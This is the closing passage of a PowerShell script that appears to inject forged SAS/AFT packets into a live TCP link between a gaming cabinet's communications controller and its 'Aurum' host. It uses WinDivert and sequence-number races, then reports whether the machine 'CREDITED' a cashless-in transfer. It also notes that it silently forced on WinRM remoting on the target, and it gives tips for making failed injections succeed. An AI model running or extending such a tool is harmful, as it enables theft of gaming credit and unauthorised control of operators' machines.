        Write-Host "[*] Launched background WinRM enable on $ComputerName (Enable-PSRemoting -Force -SkipNetworkProfileCheck). It runs detached; the NEXT run will probe 5985 and prefer WinRM automatically." -ForegroundColor DarkGray
    }
}

$swTotal.Stop()
Write-Host ''
Write-Host '================ TIMING ================' -ForegroundColor White
Write-Host ("  Stage/compile : {0,6:N1}s  ({1})" -f $stageElapsed.TotalSeconds, $(if ($cacheHit) { 'cache hit' } else { 'cache miss (compiled once)' }))
Write-Host ("  Inject (xport): {0,6:N1}s  (via $usedTransport, attempt $attempt)" -f $injectElapsed.TotalSeconds)
Write-Host ("  Ingest wait   : {0,6:N1}s" -f $ingestElapsed.TotalSeconds)
Write-Host ("  Credit wait   : {0,6:N1}s" -f $creditElapsed.TotalSeconds)
Write-Host ("  TOTAL cycle   : {0,6:N1}s  ({1})" -f $swTotal.Elapsed.TotalSeconds, ('{0:mm\:ss\.fff}' -f $swTotal.Elapsed)) -ForegroundColor Cyan
Write-Host ("  Finished at   : {0:yyyy-MM-dd HH:mm:ss}" -f (Get-Date))

Write-Host ''
Write-Host '================ RESULT ================' -ForegroundColor White
if ($ingestLine) {
    Write-Host 'INGESTED : YES' -ForegroundColor Green
    Write-Host "  $ingestLine"
    if (@($creditEvidence).Count -gt 0) {
        Write-Host 'CREDITED : evidence found' -ForegroundColor Green
        foreach ($e in $creditEvidence) { Write-Host "  $e" }
        if ($autoTransactionStatePath) {
            $autoTransactionState | ConvertTo-Json | Set-Content -LiteralPath $autoTransactionStatePath -Encoding UTF8
        }
    }
    else {
        Write-Host 'CREDITED : NO fresh credit line within the post-ingest window.' -ForegroundColor Red
        $failEnd = $ingestUtc.AddSeconds(45)
        $aftFailures = Find-AftFailureEvidence -Computer $ComputerName -StartUtc $ingestUtc -EndUtc $failEnd -TxnNumber $TransactionNumber
        if ($aftFailures -and $aftFailures.Count -gt 0) {
            Write-Host 'AURUM    : transfer did not complete cleanly (cabinet-side):' -ForegroundColor Yellow
            foreach ($f in $aftFailures) { Write-Host "  $f" -ForegroundColor Yellow }
        }
        else {
            Write-Host 'The packet reached sasmsgr, but Aurum/EGM did not post a matching fresh cashless-in. Common causes: SAS 80/81 polls not active on the link, duplicate transaction id, cashout/handpay during transfer, or amount/type rejected after ingest.' -ForegroundColor Yellow
        }
        exit 3
    }
    exit 0
}
else {
    Write-Host 'INGESTED : NO (TCP write completed but Aurum did not ingest)' -ForegroundColor Red
    if ($fatalInjectFailure) {
        Write-Host $fatalInjectFailure -ForegroundColor Yellow
    }
    elseif ($lastInjectOut -match 'NO_ESTABLISHED') {
        Write-Host 'WinDivert poll sim never started: no ESTABLISHED TCP on 31150 after the wait window. Poll+AFT requires the CommCtrl↔Aurum bridge link; when the cabinet shows mandatory service offline, wait for communications to recover naturally.' -ForegroundColor Yellow
    }
    elseif ($lastInjectOut -match 'TIMEOUT no data packet seen on srcPort') {
        Write-Host "WinDivert opened successfully, but NO outbound segment at all was seen on source port $BridgePort during the ${ObserveMs}ms observe window. ACK-anchoring was attempted (grace ${AckGraceMs}ms), so this means the connection emitted neither payload nor a bare ACK -- it is truly silent (e.g. CommCtrlSAS not running, no established 31150 -> Aurum flow, or a fully idle link with no keepalive/ACK traffic). Restore SAS/COM11 traffic on the cabinet, or raise -ObserveMs, then retry. Verify the live flow with: Get-NetTCPConnection -LocalPort 31100,31150" -ForegroundColor Yellow
    }
    else {
        Write-Host 'Likely SEQ race lost on all attempts, or WinDivert open/inject failed.' -ForegroundColor Yellow
    }
    Write-Host 'Last WdInject.exe output:' -ForegroundColor DarkGray
    Write-Host $lastInjectOut
    exit 2
}
}
finally {
    Stop-SasPollKeeper -Process $pollKeeperProc
}
